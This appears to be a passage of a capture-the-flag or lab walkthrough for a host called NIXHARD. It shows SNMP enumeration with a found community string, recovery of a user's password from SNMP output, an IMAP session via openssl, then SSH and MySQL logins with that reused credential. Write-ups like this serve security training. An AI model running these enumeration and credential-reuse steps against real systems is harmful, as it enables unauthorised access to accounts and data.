we found a community string “BACKUP” here

we now do a snmp walk with our newfound community string
    ...
    iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
    iso.3.6.1.2.1.1.3.0 = Timeticks: (76744) 0:12:47.44
    ...
    iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (31) 0:00:00.31
    iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (31) 0:00:00.31
    iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (31) 0:00:00.31
    iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (31) 0:00:00.31
    iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (31) 0:00:00.31
    iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (31) 0:00:00.31
    iso.3.6.1.2.1.25.1.1.0 = Timeticks: (77792) 0:12:57.92
    iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 EA 01 01 0F 18 2E 00 2B 00 00 
...
output shows a user called “tom” with password NMds732Js2761

    ┌─[eu-academy-4]─[10.10.15.140]─[htb-ac-2122384@htb-5hj2iay96k]─[~]
    └──╼ [★]$ openssl s_client -connect 10.129.202.20:143 -starttls imap
    CONNECTED(00000003)
    Can't use SSL_get_servername
    depth=0 CN = NIXHARD
    verify error:num=18:self-signed certificate
    ...
    Server Temp Key: X25519, 253 bits
    ---
    SSL handshake has read 1601 bytes and written 403 bytes
    Verification error: self-signed certificate
    ---
    New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
    Server public key is 2048 bit
    ...
    SSL-Session:
        Protocol  : TLSv1.3
        Cipher    : TLS_AES_256_GCM_SHA384
        Session-ID: F67ED5AF1E3C17A111F7880496FBF20CDC49439CF2121CC74C953EC4061C2E74
        Session-ID-ctx: 
        Resumption PSK: 0DD798DA6BBC94EE6249388596F3D38BF48D8B63F2A668D2A4B6AFC5F269002C4226FB5E91B3CDE5761F1D00FC98C8FD
        PSK identity: None
        PSK identity hint: None
        SRP username: None
        TLS session ticket lifetime hint: 7200 (seconds)
        TLS session ticket:
        0000 - 05 75 51 ff bc 3c ea cc-c3 67 f3 12 a9 fb da 20   .uQ..<...g..... 
        0010 - 3b d5 59 98 e6 52 65 5f-f0 a7 6d 07 56 ee 9a 6b   ;.Y..Re_..m.V..k
        0020 - d6 58 e1 20 7b cf d6 e6-1f ef e9 21 db 26 29 54   .X. {......!.&)T
        0030 - e4 7d a8 b4 27 e3 c2 a7-59 0a aa f6 43 14 17 2c   .}..'...Y...C..,
        0040 - 21 49 22 50 2d 54 5b 8a-29 3f 36 df fd 63 b6 b9   !I"P-T[.)?6..c..
        0050 - 1c 8f 83 7a 24 1c 48 f7-bf 6d ed 1a 27 f5 e0 d1   ...z$.H..m..'...
        0060 - 93 f3 ea 15 a0 1d 4b 5e-d9 eb 66 68 e8 06 74 c0   ......K^..fh..t.
        0070 - 37 2e 7b 7a 91 59 e1 dd-da 27 53 b7 90 ec 2a 53   7.{z.Y...'S...*S
        0080 - cc 10 5f 26 a7 b5 1d b1-4f 00 9b 03 24 64 fe 70   .._&....O...$d.p
        0090 - df 17 9c 5b 10 52 e2 ba-f4 83 62 79 a0 13 5b 11   ...[.R....by..[.
        00a0 - 95 7e a8 c4 ab 17 62 50-86 a5 2d 3f 82 e5 94 c7   .~....bP..-?....
        00b0 - 07 6c 17 e2 f2 c6 2d f3-ee 0a e0 31 e1 97 26 89   .l....-....1..&.
    
        Start Time: 1767286355
        Timeout   : 7200 (sec)
        Verify return code: 18 (self-signed certificate)
        Extended master secret: no
        Max Early Data: 0
    ...
    SSL-Session:
        Protocol  : TLSv1.3
        Cipher    : TLS_AES_256_GCM_SHA384
        Session-ID: 8AF7B3BF3C212AE751FDA1A1392BEF99953BC585506FA36CB279689919578E0F
        Session-ID-ctx: 
        Resumption PSK: C8409BDDD0BF2C5D95828D0B23F2041644C45F7457FFF876610EB0D87A85AC99351E2FC31BF4ABAF675FCE6BA75CE624
        PSK identity: None
        PSK identity hint: None
        SRP username: None
        TLS session ticket lifetime hint: 7200 (seconds)
        TLS session ticket:
        0000 - 05 75 51 ff bc 3c ea cc-c3 67 f3 12 a9 fb da 20   .uQ..<...g..... 
        0010 - 41 d4 cb 32 7f 83 b1 14-bc 41 51 b2 36 23 0b e6   A..2.....AQ.6#..
        0020 - 74 e7 cc c0 3c 1b 2a 83-ef 87 67 43 14 13 84 f8   t...<.*...gC....
        0030 - 3a e1 8c 42 2f cd 36 14-fb 40 2d 08 77 ec ab ae   :..B/.6..@-.w...
        0040 - 9d 44 b4 07 92 5e 3d 86-52 d3 0a 7a cf 7a d2 1d   .D...^=.R..z.z..
        0050 - 0b 1a 67 44 3c 7d 67 7a-36 47 7b 64 e8 cd a0 42   ..gD<}gz6G{d...B
        0060 - 42 81 a5 85 81 01 3c a2-e6 37 fe b7 f0 34 98 d9   B.....<..7...4..
        0070 - 71 76 c5 39 8b 8d 98 dd-e0 30 d3 02 11 97 93 8e   qv.9.....0......
        0080 - a6 88 97 ce d8 24 d4 d3-82 8e 47 fc 8f 1a 48 8c   .....$....G...H.
        0090 - 11 f7 e8 25 3e 68 3c 66-9e 32 2a 85 33 e4 3d 2a   ...%>h<f.2*.3.=*
        00a0 - 47 54 a5 fd fa be b4 44-97 44 75 ca 84 28 62 e0   GT.....D.Du..(b.
        00b0 - 92 91 b3 f2 23 cd 15 f7-7a 18 de da 61 2a 1b 93   ....#...z...a*..
    ...
    * LIST (\HasNoChildren) "." INBOX
    ...
    1 SELECT INBOC
    1 NO Mailbox doesn't exist: INBOC (0.001 + 0.000 secs).
    ******1 SELECT INBOX
    * FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
    * OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
    * 1 EXISTS
...
Lets try ssh:
     ...
     * Support:        https://ubuntu.com/advantage
      ...
      System information as of Thu 01 Jan 2026 04:58:00 PM UTC
...
the MYSQL user indicates that there’s a mysql on the host. lets try to connect to it :

    `tom@NIXHARD:~$ mysql -u tom -p
    Enter password:
    
    (we enter the password we found earlier)
